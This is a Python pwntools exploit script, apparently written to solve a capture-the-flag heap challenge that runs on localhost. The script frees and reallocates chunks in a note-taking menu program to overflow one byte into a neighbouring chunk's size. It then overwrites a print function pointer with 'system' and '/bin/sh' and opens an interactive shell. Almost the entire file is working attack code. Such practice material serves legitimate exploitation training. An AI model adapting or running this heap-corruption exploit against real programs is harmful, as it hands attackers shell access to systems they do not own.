#!/usr/bin/env python3

import ctypes

from pwn import *

context.terminal = "kitty @launch --location=split --cwd=current".split()


def start(argv=[], *a, **kw):
    if args.LOCAL:
        argv = argv if argv else [exe.path]
        if args.GDB:
            return gdb.debug(argv, gdbscript=gdbscript, *a, **kw)
        return process(argv, *a, **kw)
    return remote(args.HOST or host, args.PORT or port, *a, **kw)


def safe_flat(*args, unsafe_chars=b"\n", **kwargs):
    p = flat(args, **kwargs)
    if any(c in unsafe_chars for c in p):
        raise ValueError("unsafe:", p)
    return p


def create_text(index, size, color, text):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"(1-16): ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendlineafter(b"Color: ", str(color).encode())
    io.sendafter(b"Text: ", text)


def print_text(index):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"(1-16): ", str(index).encode())


def delete_text(index):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"(1-16): ", str(index).encode())


gdbscript = """
c
"""
host, port = args.HOST or "localhost", args.PORT or 16000
exe = context.binary = ELF(args.EXE or "../src/chall", False)

io = start()

create_text(1, 17, 1, b"overflow me\n")
create_text(2, 17, 1, b"size\n")
create_text(3, 17, 1, b"printer\n")

delete_text(1)

create_text(1, 17, 1, safe_flat({16: b"\x41"}))

delete_text(2)

create_text(2, 49, 1, safe_flat({16: [0x21, exe.sym["system"], b"/bin/sh\0"]}))

print_text(3)

io.interactive()
